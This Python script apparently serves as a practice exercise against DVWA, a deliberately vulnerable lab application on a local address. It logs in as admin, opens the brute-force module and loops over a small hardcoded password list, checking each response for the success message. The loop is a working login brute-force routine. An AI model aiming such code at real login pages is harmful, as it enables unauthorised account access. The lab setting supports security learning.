from urllib import response
import mechanicalsoup
from bs4 import BeautifulSoup

browser = mechanicalsoup.StatefulBrowser()
# browser.open("http://testphp.vulnweb.com/login.php")
browser.open("http://172.18.32.1:8081/dvwa/login.php")

#print(browser.get_url())
browser.select_form('form[action="login.php"]')
browser["username"] = "admin"
browser["password"] = "password"

# browser.form.print_summary()
browser.submit_selected()
page = browser.page
msg = page.find("div",class_ ="message")
if msg.text == "You have logged in as 'admin'":
    print(msg.text)
else:
    print("wrong credentials")
    exit(0)
print(browser.url)
#print(page1.text)

browser.follow_link("brute")
#browser = browser.get_url()
print(browser.get_url())
passwords = ["abcd", "1234", "password", "test"]
browser.select_form('form[action="#"]')

# imp
browser["username"] = "admin"
browser["password"] = "password"
browser.form.print_summary()
browser.submit_selected()
page = browser.page


#soup = BeautifulSoup(page.text,'html.parser')
#print (soup)


#print(page.text)
message = page.find("div",class_="vulnerable_code_area")
#print(message.text)
right_credentials = "Welcome to the password protected area admin"
if right_credentials in page.text:
    print("Welcome to the password protected area admin")
else:
    print("wrong credentials")
    #exit(0)
# print(browser.url)


def brute_force():
    print("\nTrying brute force approach and passwords are given: \n")
    for password in passwords:
        browser.select_form('form[action="#"]')
        print(password)
        browser["username"] = "admin"
        browser["password"] = password
        #browser["Login"] = "Login"
        browser.form.print_summary()

        browser.submit_selected()
        page = browser.page
        message = page.find("div", class_="vulnerable_code_area")
        right_credentials = "Welcome to the password protected area admin"
        if right_credentials in page.text:
            print("Welcome to the password protected area admin")
            print(password)
            exit(0)
        else:
            print("wrong credentials")    
        # if browser.url == "http://172.31.208.1: 8081/dvwa/vulnerabilities/brute /?username = admin & password = password & Login = Login":
        #     print("passwod is: "+password)
        #     break
        # else:
        #     browser.follow_link("brute")


# brute_force()
